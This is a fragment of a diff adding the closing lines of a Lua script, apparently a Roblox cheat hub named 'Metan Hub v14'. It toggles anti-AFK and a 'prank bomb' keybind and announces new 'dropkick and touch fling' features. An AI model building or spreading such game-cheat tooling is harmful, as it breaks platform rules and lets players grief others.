+                        if hl then hl:Destroy() end\
+                    end\
+                end\
+            end\
+        end)\
+        task.wait(0.1)\
+    end\
+end)\
+loadSettings()\
+toggleAntiAfk(_G.AntiAfkEnabled)\
+togglePrankBombKeybind(_G.PrankBombKey)\
+Window:SelectTab(1)\
+task.delay(1, function()\
+    Notify(\"Metan Hub v14\", \"Added dropkick and touch fling\", \"Success\", \"home\", 6)\
+end)")
+game.PlaceId
